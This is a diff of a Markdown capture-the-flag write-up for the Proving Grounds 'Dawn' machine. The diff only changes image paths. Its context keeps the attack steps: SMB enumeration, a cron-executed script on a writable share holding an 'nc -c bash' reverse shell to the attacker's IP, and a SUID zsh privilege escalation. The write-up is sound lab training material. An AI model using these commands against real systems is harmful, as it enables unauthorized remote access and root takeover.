@@ -29,11 +29,11 @@ PORT     STATE SERVICE     VERSION
 
 ### Directory Fuzzing
 
-![img](/assets/images/CTF/Pg-Play/Dawn/dir.png)
+![img](/assets/images/CTF/Proving_Grounds/Dawn/dir.png)
 
 ### Logs
 
-![img](/assets/images/CTF/Pg-Play/Dawn/logs.png)
+![img](/assets/images/CTF/Proving_Grounds/Dawn/logs.png)
 
 ## SMB Enumeration
 
@@ -41,7 +41,7 @@ PORT     STATE SERVICE     VERSION
 smbclient -L //192.168.175.11/ -N
 ```
 
-![img](/assets/images/CTF/Pg-Play/Dawn/smb1.png)
+![img](/assets/images/CTF/Proving_Grounds/Dawn/smb1.png)
 
 As per the `management.log` file there is a cron job running on `ITDEPT` folder, and in SMB we have access to the ITDEPT folder.
 
@@ -58,11 +58,11 @@ nc -c bash 192.168.45.223 1234
 
 So when the cronjob runs the script we will get the reverse shell.
 
-![img](/assets/images/CTF/Pg-Play/Dawn/smb2.png)
+![img](/assets/images/CTF/Proving_Grounds/Dawn/smb2.png)
 
 Wait for few seconds for the cron job to run.
 
-![img](/assets/images/CTF/Pg-Play/Dawn/shell.png)
+![img](/assets/images/CTF/Proving_Grounds/Dawn/shell.png)
 
 **Initial Foothold Obtained**
 
@@ -96,7 +96,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 The SUID `zsh` is exploitable, direct to GTFO bins and find the exploit.
 
-![img](/assets/images/CTF/Pg-Play/Dawn/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Dawn/root.png)
 
 **Root Obtained**
 
